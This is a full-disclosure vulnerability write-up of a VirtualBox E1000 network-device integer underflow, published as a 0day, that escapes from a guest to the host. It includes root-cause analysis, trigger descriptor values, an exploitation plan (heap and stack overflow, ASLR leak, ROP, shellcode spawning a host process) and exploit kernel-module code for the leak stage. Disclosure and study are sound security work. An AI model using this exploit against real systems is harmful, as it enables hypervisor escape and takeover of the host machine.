## Why
I like VirtualBox and it has nothing to do with why I publish a 0day vulnerability. The reason is my disagreement with contemporary state of infosec, especially of security research and bug bounty:

1) Wait half a year until a vulnerability is patched is considered fine.
2) In the bug bounty field these are considered fine:
    1) Wait more than month until a submitted vulnerability is verified and a decision to buy or not to buy is made.
    2) Change the decision on the fly. Today you figured out the bug bounty program will buy bugs in a software, week later you come with bugs and exploits and receive "not interested".
    3) Have not a precise list of software a bug bounty is interested to buy bugs in. Handy for bug bounties, awkward for researchers.
    4) Have not precise lower and upper bounds of vulnerability prices. There are many things influencing a price but researchers need to know what is worth to work on and what is not.
3) Delusion of grandeur and marketing bullshit: naming vulnerabilities and creating websites for them; making a thousand conferences in a year; exaggerating importance of own job as a security researcher; considering yourself "a world saviour". Come down, Your Highness.

I'm exhausted of the first two, therefore my move is full disclosure. Infosec, please move forward.

## General Information
**Vulnerable software:** VirtualBox 5.2.20 and prior versions.

**Host OS:** any, the bug is in a shared code base.

**Guest OS:** any.

**VM configuration:** default (the only requirement is that a network card is Intel PRO/1000 MT Desktop (82540EM) and a mode is NAT).

## How to protect yourself
Until the patched VirtualBox build is out you can change the network card of your virtual machines to PCnet (either of two) or to Paravirtualized Network. If you can't, change the mode from NAT to another one. The former way is more secure.

## Introduction
A default VirtualBox virtual network device is Intel PRO/1000 MT Desktop (82540EM) and the default network mode is NAT. We will refer to it E1000.

The E1000 has a vulnerability allowing an attacker with root/administrator privileges in a guest to escape to a host ring3. Then the attacker can use existing techniques to escalate privileges to ring 0 via /dev/vboxdrv.

## Vulnerability Details

### E1000 101
To send network packets a guest does what a common PC does: it configures a network card and supplies network packets to it. Packets are of data link layer frames and of other, more high level headers. Packets supplied to the adaptor are wrapped in Tx descriptors (Tx means transmit). The Tx descriptor is data structure described in the 82540EM datasheet (317453006EN.PDF, Revision 4.0). It stores such metainformation as packet size, VLAN tag, TCP/IP segmentation enabled flags and so on.

The 82540EM datasheet provides for three Tx descriptor types: legacy, context, data. Legacy is deprecated I believe. The other two are used together. The only thing we care of is that context descriptors set the maximum packet size and switch TCP/IP segmentation, and that data descriptors hold physical addresses of network packets and their sizes. The data descriptor's packet size must be lesser than the context descriptor's maximum packet size. Usually context descriptors are supplied to the network card before data descriptors.

To supply Tx descriptors to the network card a guess writes them to Tx Ring. This is a ring buffer residing in physical memory at a predefined address. When all descriptors are written down to Tx Ring the guest updates E1000 MMIO TDT register (Transmit Descriptor Tail) to tell the host there are new descriptors to handle.

### Input
Consider the following array of Tx descriptors:

```
[context_1, data_2, data_3, context_4, data_5]
```

Let's assign their structure fields as follows (field names are hypothetical to be human readable but directly map to the 82540EM specification):

```
context_1.header_length = 0
context_1.maximum_segment_size = 0x3010
context_1.tcp_segmentation_enabled = true

data_2.data_length = 0x10
data_2.end_of_packet = false
data_2.tcp_segmentation_enabled = true

data_3.data_length = 0
data_3.end_of_packet = true
data_3.tcp_segmentation_enabled = true

context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
```

We will learn why they should be like that in our step-by-step analysis.

### Root Cause Analysis

#### [context_1, data_2, data_3] Processing
Let's assume the descriptors above are written to the Tx Ring in the specified order and TDT register is updated by the guest. Now the host will execute e1kXmitPending function in src/VBox/Devices/Network/DevE1000.cpp file (most of comments are and will be stripped for the sake of readability):

```c
static int e1kXmitPending(PE1KSTATE pThis, bool fOnWorkerThread)
{
...
        while (!pThis->fLocked && e1kTxDLazyLoad(pThis))
        {
            while (e1kLocateTxPacket(pThis))
            {
                fIncomplete = false;
                rc = e1kXmitAllocBuf(pThis, pThis->fGSO);
                if (RT_FAILURE(rc))
                    goto out;
                rc = e1kXmitPacket(pThis, fOnWorkerThread);
                if (RT_FAILURE(rc))
                    goto out;
            }
```

e1kTxDLazyLoad will read all the 5 Tx descriptors from the Tx Ring. Then e1kLocateTxPacket is called for the first time. This function iterates through all the descriptors to set up an initial state but does not actually handle them. In our case the first call to e1kLocateTxPacket will handle context_1, data_2, and data_3 descriptors. The two remaining descriptors, context_4 and data_5, will be handled at the second iteration of the while loop (we will cover the second iteration in the next section). This two-part array division is crucial to trigger the vulnerability so let's figure out why.

e1kLocateTxPacket looks like this:

```c
static bool e1kLocateTxPacket(PE1KSTATE pThis)
{
...
    for (int i = pThis->iTxDCurrent; i < pThis->nTxDFetched; ++i)
    {
        E1KTXDESC *pDesc = &pThis->aTxDescriptors[i];
        switch (e1kGetDescType(pDesc))
        {
            case E1K_DTYP_CONTEXT:
                e1kUpdateTxContext(pThis, pDesc);
                continue;
            case E1K_DTYP_LEGACY:
                ...
                break;
            case E1K_DTYP_DATA:
                if (!pDesc->data.u64BufAddr || !pDesc->data.cmd.u20DTALEN)
                    break;
                ...
                break;
            default:
                AssertMsgFailed(("Impossible descriptor type!"));
        }
```

The first descriptor (context_1) is of E1K_DTYP_CONTEXT so e1kUpdateTxContext function is called. This function updates a TCP Segmentation Context if TCP Segmentation is enabled for the descriptor. It is true for context_1 so the TCP Segmentation Context will be updated. (What the TCP Segmentation Context Update actually is, is not important, and we will use this just to refer the code below).

The second descriptor (data_2) is of E1K_DTYP_DATA so several actions unnecessary for the discussion will be performed.

The third descriptor (data_3) is also of E1K_DTYP_DATA but since data_3.data_length == 0 no action is performed.

At the moment the three descriptors are initially processed and the two remain. Now the thing: after the switch statement there is a check wheter a descriptor's end_of_packet field was set. It is true for data_3 descriptor (data_3.end_of_packet == true). The code does some actions and returns from the function:

```c
        if (pDesc->legacy.cmd.fEOP)
        {
            ...
            return true;
        }
```

If data_3.end_of_packet would been false then the remaining context_4 and data_5 descriptors would be processed, and the vulnerability would been bypassed. Below you'll see why that return from the function leads to the bug.

At the end of e1kLocateTxPacket function we have the following descriptors ready to unwrap network packets from and to send to a network: context_1, data_2, data_3. Then the inner loop of e1kXmitPending calls e1kXmitPacket. This functions iterates through all the descriptors (5 in our case) to actually process them:

```c
static int e1kXmitPacket(PE1KSTATE pThis, bool fOnWorkerThread)
{
...
    while (pThis->iTxDCurrent < pThis->nTxDFetched)
    {
        E1KTXDESC *pDesc = &pThis->aTxDescriptors[pThis->iTxDCurrent];
        ...
        rc = e1kXmitDesc(pThis, pDesc, e1kDescAddr(TDBAH, TDBAL, TDH), fOnWorkerThread);
        ...
        if (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT && pDesc->legacy.cmd.fEOP)
            break;
    }
```

For each descriptor e1kXmitDesc function is called:

```c
static int e1kXmitDesc(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr,
                       bool fOnWorkerThread)
{
...
    switch (e1kGetDescType(pDesc))
    {
        case E1K_DTYP_CONTEXT:
            ...
            break;
        case E1K_DTYP_DATA:
        {
            ...
            if (pDesc->data.cmd.u20DTALEN == 0 || pDesc->data.u64BufAddr == 0)
            {
                E1kLog2(("% Empty data descriptor, skipped.\n", pThis->szPrf));
            }
            else
            {
                if (e1kXmitIsGsoBuf(pThis->CTX_SUFF(pTxSg)))
                {
                    ...
                }
                else if (!pDesc->data.cmd.fTSE)
                {
                    ...
                }
                else
                {
                    STAM_COUNTER_INC(&pThis->StatTxPathFallback);
                    rc = e1kFallbackAddToFrame(pThis, pDesc, fOnWorkerThread);
                }
            }
            ...
```

The first descriptor passed to e1kXmitDesc is context_1. The function does nothing with context descriptors.

The second descriptor passed to e1kXmitDesc is data\_2. Since all of our data descriptors have tcp\_segmentation\_enable == true (pDesc->data.cmd.fTSE above) we call e1kFallbackAddToFrame where there will be an integer underflow while data\_5 is processed.

```c
static int e1kFallbackAddToFrame(PE1KSTATE pThis, E1KTXDESC *pDesc, bool fOnWorkerThread)
{
    ...
    uint16_t u16MaxPktLen = pThis->contextTSE.dw3.u8HDRLEN + pThis->contextTSE.dw3.u16MSS;

    /*
     * Carve out segments.
     */
    int rc = VINF_SUCCESS;
    do
    {
        /* Calculate how many bytes we have left in this TCP segment */
        uint32_t cb = u16MaxPktLen - pThis->u16TxPktLen;
        if (cb > pDesc->data.cmd.u20DTALEN)
        {
            /* This descriptor fits completely into current segment */
            cb = pDesc->data.cmd.u20DTALEN;
            rc = e1kFallbackAddSegment(pThis, pDesc->data.u64BufAddr, cb, pDesc->data.cmd.fEOP /*fSend*/, fOnWorkerThread);
        }
        else
        {
            ...
        }

        pDesc->data.u64BufAddr    += cb;
        pDesc->data.cmd.u20DTALEN -= cb;
    } while (pDesc->data.cmd.u20DTALEN > 0 && RT_SUCCESS(rc));

    if (pDesc->data.cmd.fEOP)
    {
        ...
        pThis->u16TxPktLen = 0;
        ...
    }

    return VINF_SUCCESS; /// @todo consider rc;
}
```

The most important variables here are u16MaxPktLen, pThis->u16TxPktLen, and pDesc->data.cmd.u20DTALEN.

Let's draw a table where values of these variables are specified before and after execution of e1kFallbackAddToFrame function for the two data descriptors. 

Tx Descriptor | Before/After | u16MaxPktLen | pThis->u16TxPktLen | pDesc->data.cmd.u20DTALEN
--- | --- | --- | --- | ---
data_2 | Before | 0x3010 | 0 | 0x10
 -| After | 0x3010 | 0x10 | 0 
data_3 | Before | 0x3010 | 0x10 | 0
 -| After | 0x3010 | 0x10 | 0

You just need to note that when data_3 is processed pThis->u16TxPktLen equals to 0x10.

Next is the most important part. Please look again at the end of the snippet of e1kXmitPacket:

```c
        if (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT && pDesc->legacy.cmd.fEOP)
            break;
```

Since data_3 type != E1K_DTYP_CONTEXT and data_3.end_of_packet == true, we break from the loop despite the fact that there are context_4 and data_5 to be processed. Why is it important? The key to understand the vulnerability is to understand that all context descriptors are processed before data descriptors. Context descriptors are processed during the TCP Segmentation Context Update in e1kLocateTxPacket. Data descriptors are processed later in the loop inside e1kXmitPacket function. The developer intention was to forbid changing u16MaxPktLen after some data was processed to prevent integer underflows in the code:

```c
uint32_t cb = u16MaxPktLen - pThis->u16TxPktLen;
```

But we are able to bypass this protection: recall that in e1kLocateTxPacket we forced the function to return because of data_3.end_of_packet == true. And because of that we have two descriptors (context_4 and data_5) left to be processed despite the fact that pThis->u16TxPktLen is 0x10, not 0. So there is a possibility to change u16MaxPktLen using context_4.maximum_segment_size to make the integer underflow.

#### [context_4, data_5] Processing
Now when the first three descriptors were processed we again arrive to the inner loop of e1kXmitPending:

```c
            while (e1kLocateTxPacket(pThis))
            {
                fIncomplete = false;
                rc = e1kXmitAllocBuf(pThis, pThis->fGSO);
                if (RT_FAILURE(rc))
                    goto out;
                rc = e1kXmitPacket(pThis, fOnWorkerThread);
                if (RT_FAILURE(rc))
                    goto out;
            }
```

Here we call e1kLocateTxPacket do the initial processing of context_4 and data_5 descriptors. It has been said that we can set context_4.maximum_segment_size to a size lesser than the size of data already read i.e. lesser than 0x10. Recall our input Tx descriptors:

```
context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
```

As a result of the call to e1kLocateTxPacket we have the maximum segment size equals to 0xF, whereas the size of data already read is 0x10.

Finally, when processing data_5 we again arrive to e1kFallbackAddToFrame and have the following variable values:

Tx Descriptor | Before/After | u16MaxPktLen | pThis->u16TxPktLen |  pDesc->data.cmd.u20DTALEN
--- | --- | --- | --- | --- 
data_5 | Before | 0xF | 0x10 | 0x4188
-| After | - | - | -

And therefore we have an integer underflow:

```c
uint32_t cb = u16MaxPktLen - pThis->u16TxPktLen;
=>
uint32_t cb = 0xF - 0x10 = 0xFFFFFFFF;
```

This makes the following check to be true since 0xFFFFFFFF > 0x4188:

```c
        if (cb > pDesc->data.cmd.u20DTALEN)
        {
            cb = pDesc->data.cmd.u20DTALEN;
            rc = e1kFallbackAddSegment(pThis, pDesc->data.u64BufAddr, cb, pDesc->data.cmd.fEOP /*fSend*/, fOnWorkerThread);
        }
```

e1kFallbackAddSegment function will be called with size 0x4188. Without the vulnerability it's impossible to call e1kFallbackAddSegment with a size greater than 0x4000 because, during the TCP Segmentation Context Update in e1kUpdateTxContext, there is a check that the maximum segment size is less or equal to 0x4000:

```c
DECLINLINE(void) e1kUpdateTxContext(PE1KSTATE pThis, E1KTXDESC *pDesc)
{
...
        uint32_t cbMaxSegmentSize = pThis->contextTSE.dw3.u16MSS + pThis->contextTSE.dw3.u8HDRLEN + 4; /*VTAG*/
        if (RT_UNLIKELY(cbMaxSegmentSize > E1K_MAX_TX_PKT_SIZE))
        {
            pThis->contextTSE.dw3.u16MSS = E1K_MAX_TX_PKT_SIZE - pThis->contextTSE.dw3.u8HDRLEN - 4; /*VTAG*/
            ...
        }
```

### Buffer Overflow
We have called e1kFallbackAddSegment with size 0x4188. How this can be abused? There are at least two possibilities I found. Firstly, data will be read from the guest into a heap buffer:

```c
static int e1kFallbackAddSegment(PE1KSTATE pThis, RTGCPHYS PhysAddr, uint16_t u16Len, bool fSend, bool fOnWorkerThread)
{
    ...
    PDMDevHlpPhysRead(pThis->CTX_SUFF(pDevIns), PhysAddr,
                      pThis->aTxPacketFallback + pThis->u16TxPktLen, u16Len);
```

Here pThis->aTxPacketFallback is the buffer of size 0x3FA0 and u16Len is 0x4188 — an obvious overflow that can lead, for example, to a function pointers overwrite.

Secondly, if we dig deeper we found that e1kFallbackAddSegment calls e1kTransmitFrame that can, with a certain configuration of E1000 registers, call e1kHandleRxPacket function. This function allocates a stack buffer of size 0x4000 and then copies data of a specified length (0x4188 in our case) to the buffer without any check:

```c
static int e1kHandleRxPacket(PE1KSTATE pThis, const void *pvBuf, size_t cb, E1KRXDST status)
{
#if defined(IN_RING3)
    uint8_t   rxPacket[E1K_MAX_RX_PKT_SIZE];
    ...
    if (status.fVP)
    {
        ...
    }
    else
        memcpy(rxPacket, pvBuf, cb);
```

As you see, we turned an integer underflow to a classical stack buffer overflow. The two overflows above — heap and stack ones — are used in the exploit.

## Exploit
The exploit is Linux kernel module (LKM) to load in a guest OS. The Windows case would require a driver differing from the LKM just by an initialization wrapper and kernel API calls.

Elevated privileges are required to load a driver in both OSs. It's common and isn't considered an insurmountable obstacle. Look at Pwn2Own contest where researcher use exploit chains: a browser opened a malicious website in the guest OS is exploited, a browser sandbox escape is made to gain full ring 3 access, an operating system vulnerability is exploited to pave a way to ring 0 from where there are anything you need to attack a hypervisor from the guest OS.
The most powerful hypervisor vulnerabilities are for sure those that can be exploited from guest ring 3. There in VirtualBox is also such code that is reachable without guest root privileges, and it's mostly not audited yet.

The exploit is 100% reliable. It means it either works always or never because of mismatched binaries or other, more subtle reasons I didn't account. It works at least on Ubuntu 16.04 and 18.04 x86_64 guests with default configuration.

### Exploitation Algorithm
1) An attacker unloads e1000.ko loaded by default in Linux guests and loads the exploit's LKM.
2) The LKM initializes E1000 according to the datasheet. Only the transmit half is initialized since there is no need for the receive half.
3) Step 1: information leak.
    1) The LKM disables E1000 loopback mode to make stack buffer overflow code unreachable.
    2) The LKM uses the integer underflow vulnerability to make the heap buffer overflow.
    3) The heap buffer overflow allows for use E1000 EEPROM to write two any bytes relative to a heap buffer in 128 KB range. Hence the attacker gains a write primitive.
    4) The LKM uses the write primitive 8 times to write bytes to ACPI (Advanced Configuration and Power Interface) data structure on heap. Bytes are written to an index variable of a heap buffer from which a single byte will be read. Since the buffer size is lesser than maximum index number (255) the attacker can read past the buffer, hence he/she gains a read primitive.
    5) The LKM uses the read primitive 8 times to access ACPI and obtain 8 bytes from the heap. Those bytes are pointer of VBoxDD.so shared library.
    6) The LKM subtracts RVA from the pointer to obtain VBoxDD.so image base.
4) Step 2: stack buffer overflow.
    1) The LKM enabled E1000 loopback mode to make stack buffer overflow code reachable.
    2) The LKM uses the integer underflow vulnerability to make the heap buffer overflow and the stack buffer overflow. Saved return address (RIP/EIP) is overwritten. The attacker gains control.
    3) ROP chain is executed to execute a shellcode loader.
5) Step 3: shellcode.
    1) The shellcode loader copies a shellcode from the stack next to itself. The shellcode is executed.
    2) The shellcode does fork and execve syscalls to spawn an arbitrary process on the host side.
    3) The parent process does process continuation.
6) The attacker unloads the LKM and loads e1000.ko back to allow the guest to use network.

### Initialization
The LKM maps physical memory regarding to E1000 MMIO. Physical address and size are predefined by the hypervisor.

```c
void* map_mmio(void) {
    off_t pa = 0xF0000000;
    size_t len = 0x20000;

    void* va = ioremap(pa, len);
    if (!va) {
        printk(KERN_INFO PFX"ioremap failed to map MMIO\n");
        return NULL;
    }

    return va;
}
```

Then E1000 general purpose registers are configured, Tx Ring memory is allocated, transmit registers are configured.

```c
void e1000_init(void* mmio) {
    // Configure general purpose registers

    configure_CTRL(mmio);

    // Configure TX registers

    g_tx_ring = kmalloc(MAX_TX_RING_SIZE, GFP_KERNEL);
    if (!g_tx_ring) {
        printk(KERN_INFO PFX"Failed to allocate TX Ring\n");
        return;
    }

    configure_TDBAL(mmio);
    configure_TDBAH(mmio);
    configure_TDLEN(mmio);
    configure_TCTL(mmio);
}
```

### ASLR Bypass
#### Write primitive
From the beginning of exploit development I decided not to use primitives found in services disabled by default. This means in the first place the Chromium service (not a browser) that provides for 3D acceleration where more than 40 vulnerabilities are found by researchers in the last year.

The problem was to find an information leak in default VirtualBox subsystems. The obvious thought was that if the integer underflow allows to overflow the heap buffer then we control anything past the buffer. We'll see that not a single additional vulnerability was required: the integer underflow appeared to be quite powerful to derive read, write, and information leak primitives from it, not saying of the stack buffer overflow.

Let's examine what exactly is overflowed on the heap.

```c
/**
 * Device state structure.
 */
struct E1kState_st
{
...
    uint8_t     aTxPacketFallback[E1K_MAX_TX_PKT_SIZE];
...
    E1kEEPROM   eeprom;
...
}
```

Here aTxPacketFallback is a buffer of size 0x3FA0 which will be overflowed with bytes copied from a data descriptor. Searching for interesting fields after the buffer I came to E1kEEPROM structure which contains another structure with the following fields (src/VBox/Devices/Network/DevE1000.cpp):

```c
/**
 * 93C46-compatible EEPROM device emulation.
 */
struct EEPROM93C46
{
...
    bool m_fWriteEnabled;
    uint8_t Alignment1;
    uint16_t m_u16Word;
    uint16_t m_u16Mask;
    uint16_t m_u16Addr;
    uint32_t m_u32InternalWires;
...
}
```

How can we abuse them? E1000 implements EEPROM, secondary adaptor memory. The guest OS can access it via E1000 MMIO registers. EEPROM is implemented as a finite automaton with several states and does four actions. We are interested only in "write to memory". This is how it looks (src/VBox/Devices/Network/DevEEPROM.cpp):

```c
EEPROM93C46::State EEPROM93C46::opWrite()
{
    storeWord(m_u16Addr, m_u16Word);
    return WAITING_CS_FALL;
}

void EEPROM93C46::storeWord(uint32_t u32Addr, uint16_t u16Value)
{
    if (m_fWriteEnabled) {
        E1kLog(("EEPROM: Stored word %04x at %08x\n", u16Value, u32Addr));
        m_au16Data[u32Addr] = u16Value;
    }
    m_u16Mask = DATA_MSB;
}
```

Here m_u16Addr, m_u16Word, and m_fWriteEnabled are fields of EEPROM93C46 structure we control. We can malform them in a way that

```c
m_au16Data[u32Addr] = u16Value;
```

statement will write two bytes at arbitrary 16-bit offset from m_au16Data that also residing in the structure. We have found a write primitive.

#### Read primitive
The next problem was to find data structures on the heap to write arbitrary data into, pursuing the main goal to leak a shared library pointer to get its image base. Hopefully, it was need not to do an unstable heap spray because virtual devices' main data structures appeared to be allocated from an internal hypervisor heap in the way that the distance between them is always constant, despite that their virtual addresses, of course, are randomized by ASLR.

When a virtual machine is launched the PDM (Pluggable Device and Driver Manager) subsystem allocates PDMDEVINS objects in the hypervisor heap.

```c
int pdmR3DevInit(PVM pVM)
{
...
        PPDMDEVINS pDevIns;
        if (paDevs[i].pDev->pReg->fFlags & (PDM_DEVREG_FLAGS_RC | PDM_DEVREG_FLAGS_R0))
            rc = MMR3HyperAllocOnceNoRel(pVM, cb, 0, MM_TAG_PDM_DEVICE, (void **)&pDevIns);
        else
            rc = MMR3HeapAllocZEx(pVM, MM_TAG_PDM_DEVICE, cb, (void **)&pDevIns);
...
```

I traced that code under GDB using a script and got these results:

```
[trace-device-constructors] Constructing a device #0x0:
[trace-device-constructors] Name: "pcarch", '\000' <repeats 25 times>
[trace-device-constructors] Description: 0x7fc44d6f125a "PC Architecture Device"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d57517b <pcarchConstruct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc45486c1b0
[trace-device-constructors] Data size: 0x8

[trace-device-constructors] Constructing a device #0x1:
[trace-device-constructors] Name: "pcbios", '\000' <repeats 25 times>
[trace-device-constructors] Description: 0x7fc44d6ef37b "PC BIOS Device"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d56bd3b <pcbiosConstruct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc45486c720
[trace-device-constructors] Data size: 0x11e8

...

[trace-device-constructors] Constructing a device #0xe:
[trace-device-constructors] Name: "e1000", '\000' <repeats 26 times>
[trace-device-constructors] Description: 0x7fc44d70c6d0 "Intel PRO/1000 MT Desktop Ethernet.\n"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d622969 <e1kR3Construct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc470083400
[trace-device-constructors] Data size: 0x53a0

[trace-device-constructors] Constructing a device #0xf:
[trace-device-constructors] Name: "ichac97", '\000' <repeats 24 times>
[trace-device-constructors] Description: 0x7fc44d716ac0 "ICH AC'97 Audio Controller"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d66a90f <ichac97R3Construct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc470088b00
[trace-device-constructors] Data size: 0x1848

[trace-device-constructors] Constructing a device #0x10:
[trace-device-constructors] Name: "usb-ohci", '\000' <repeats 23 times>
[trace-device-constructors] Description: 0x7fc44d707025 "OHCI USB controller.\n"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d5ea841 <ohciR3Construct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc47008a4e0
[trace-device-constructors] Data size: 0x1728

[trace-device-constructors] Constructing a device #0x11:
[trace-device-constructors] Name: "acpi", '\000' <repeats 27 times>
[trace-device-constructors] Description: 0x7fc44d6eced8 "Advanced Configuration and Power Interface"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d563431 <acpiR3Construct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc47008be70
[trace-device-constructors] Data size: 0x1570

[trace-device-constructors] Constructing a device #0x12:
[trace-device-constructors] Name: "GIMDev", '\000' <repeats 25 times>
[trace-device-constructors] Description: 0x7fc44d6f17fa "VirtualBox GIM Device"
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d575cde <gimdevR3Construct(PPDMDEVINS, int, PCFGMNODE)>
[trace-device-constructors] Instance: 0x7fc47008dba0
[trace-device-constructors] Data size: 0x90

[trace-device-constructors] Instances:
[trace-device-constructors] #0x0 Address: 0x7fc45486c1b0
[trace-device-constructors] #0x1 Address 0x7fc45486c720 differs from previous by 0x570
[trace-device-constructors] #0x2 Address 0x7fc4700685f0 differs from previous by 0x1b7fbed0
[trace-device-constructors] #0x3 Address 0x7fc4700696d0 differs from previous by 0x10e0
[trace-device-constructors] #0x4 Address 0x7fc47006a0d0 differs from previous by 0xa00
[trace-device-constructors] #0x5 Address 0x7fc47006a450 differs from previous by 0x380
[trace-device-constructors] #0x6 Address 0x7fc47006a920 differs from previous by 0x4d0
[trace-device-constructors] #0x7 Address 0x7fc47006ad50 differs from previous by 0x430
[trace-device-constructors] #0x8 Address 0x7fc47006b240 differs from previous by 0x4f0
[trace-device-constructors] #0x9 Address 0x7fc4548ec9a0 differs from previous by 0x-1b77e8a0
[trace-device-constructors] #0xa Address 0x7fc470075f90 differs from previous by 0x1b7895f0
[trace-device-constructors] #0xb Address 0x7fc488022000 differs from previous by 0x17fac070
[trace-device-constructors] #0xc Address 0x7fc47007cf80 differs from previous by 0x-17fa5080
[trace-device-constructors] #0xd Address 0x7fc4700820f0 differs from previous by 0x5170
[trace-device-constructors] #0xe Address 0x7fc470083400 differs from previous by 0x1310
[trace-device-constructors] #0xf Address 0x7fc470088b00 differs from previous by 0x5700
[trace-device-constructors] #0x10 Address 0x7fc47008a4e0 differs from previous by 0x19e0
[trace-device-constructors] #0x11 Address 0x7fc47008be70 differs from previous by 0x1990
[trace-device-constructors] #0x12 Address 0x7fc47008dba0 differs from previous by 0x1d30
```

Note the E1000 device at #0xE position. It can be seen in the second list that the following device is at 0x5700 offset from E1000, the next is at 0x19E0 and so on. We already said that these distances are always the same, and it's our exploitation opportunity.

Devices following E1000 are ICH IC'97, OHCI, ACPI, VirtualBox GIM. Learning their data structures I figured the way to use the write primitive.

On virtual machine boot up the ACPI device is created (src/VBox/Devices/PC/DevACPI.cpp):

```c
typedef struct ACPIState
{
...
    uint8_t             au8SMBusBlkDat[32];
    uint8_t             u8SMBusBlkIdx;
    uint32_t            uPmTimeOld;
    uint32_t            uPmTimeA;
    uint32_t            uPmTimeB;
    uint32_t            Alignment5;
} ACPIState;
```

An ACPI port input/output handler is registered for 0x4100-0x410F range. In the case of 0x4107 port we have:

```c
PDMBOTHCBDECL(int) acpiR3SMBusRead(PPDMDEVINS pDevIns, void *pvUser, RTIOPORT Port, uint32_t *pu32, unsigned cb)
{
    RT_NOREF1(pDevIns);
    ACPIState *pThis = (ACPIState *)pvUser;
...
    switch (off)
    {
...
        case SMBBLKDAT_OFF:
            *pu32 = pThis->au8SMBusBlkDat[pThis->u8SMBusBlkIdx];
            pThis->u8SMBusBlkIdx++;
            pThis->u8SMBusBlkIdx &= sizeof(pThis->au8SMBusBlkDat) - 1;
            break;
...
```

When the guest OS executes INB(0x4107) instruction to read one byte from the port, the handler takes one bytes from au8SMBusBlkDat[32] array at u8SMBusBlkIdx index and returns it to the guest. And this is how to apply the write primitive: since the distance between virtual device heap blocks are constant, so is the distance from EEPROM93C46.m_au16Data array to ACPIState.u8SMBusBlkIdx. Writing two bytes to ACPIState.u8SMBusBlkIdx we can read arbitrary data in the range of 255 bytes from ACPIState.au8SMBusBlkDat.

There is an obstacle. Having a look to ACPIState structure it can be seen that the array is placed at the end of the structure. The remaining fields are useless to leak. So let's look what can be found after the structure:

```
gef➤  x/16gx (ACPIState*)(0x7fc47008be70+0x100)+1
0x7fc47008d4e0:	0xffffe98100000090	0xfffd9b2000000000
0x7fc47008d4f0:	0x00007fc470067a00	0x00007fc470067a00
0x7fc47008d500:	0x00000000a0028a00	0x00000000000e0000
0x7fc47008d510:	0x00000000000e0fff	0x0000000000001000
0x7fc47008d520:	0x000000ff00000002	0x0000100000000000
0x7fc47008d530:	0x00007fc47008c358	0x00007fc44d6ecdc6
0x7fc47008d540:	0x0031000035944000	0x00000000000002b8
0x7fc47008d550:	0x00280001d3878000	0x0000000000000000
gef➤  x/s 0x00007fc44d6ecdc6
0x7fc44d6ecdc6:	"ACPI RSDP"
gef➤  vmmap VBoxDD.so
Start                           End                             Offset                          Perm Path
0x00007fc44d4f3000 0x00007fc44d768000 0x0000000000000000 r-x /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d768000 0x00007fc44d968000 0x0000000000275000 --- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d968000 0x00007fc44d977000 0x0000000000275000 r-- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d977000 0x00007fc44d980000 0x0000000000284000 rw- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
gef➤  p 0x00007fc44d6ecdc6 - 0x00007fc44d4f3000
$2 = 0x1f9dc6
```

It seems there is a pointer to a string placed at a fixed offset from VBoxDD.so image base. The pointer lies at 0x58 offset at the end of ACPIState. We can read that pointer byte-by-byte using the primitives and finally obtain VBoxDD.so image base. We just hope that data past ACPIState structure is not random on each virtual machine boot. Hopefully, it isn't; the pointer at 0x58 offset is always there.

#### Information Leak
Now we combine write and read primitives and exploit them to bypass ASLR. We will overflow the heap overwriting EEPROM93C46 structure, then trigger EEPROM finite automaton to write the index to ACPIState structure, and then execute INB(0x4107) in the guest to access ACPI to read one byte of the pointer. Repeat those 8 times incrementing the index by 1.

```c
uint64_t stage_1_main(void* mmio, void* tx_ring) {
    printk(KERN_INFO PFX"##### Stage 1 #####\n");

    // When loopback mode is enabled data (network packets actually) of every Tx Data Descriptor 
    // is sent back to the guest and handled right now via e1kHandleRxPacket.
    // When loopback mode is disabled data is sent to a network as usual.
    // We disable loopback mode here, at Stage 1, to overflow the heap but not touch the stack buffer
    // in e1kHandleRxPacket. Later, at Stage 2 we enable loopback mode to overflow heap and 
    // the stack buffer.
    e1000_disable_loopback_mode(mmio);

    uint8_t leaked_bytes[8];
    uint32_t i;
    for (i = 0; i < 8; i++) {
        stage_1_overflow_heap_buffer(mmio, tx_ring, i);
        leaked_bytes[i] = stage_1_leak_byte();

        printk(KERN_INFO PFX"Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
    }

    uint64_t leaked_vboxdd_ptr = *(uint64_t*)leaked_bytes;
    uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_RVA;
    printk(KERN_INFO PFX"Leaked VBoxDD.so pointer: 0x%016llx\n", leaked_vboxdd_ptr);
    printk(KERN_INFO PFX"Leaked VBoxDD.so base: 0x%016llx\n", vboxdd_base);

    return vboxdd_base;
}
```

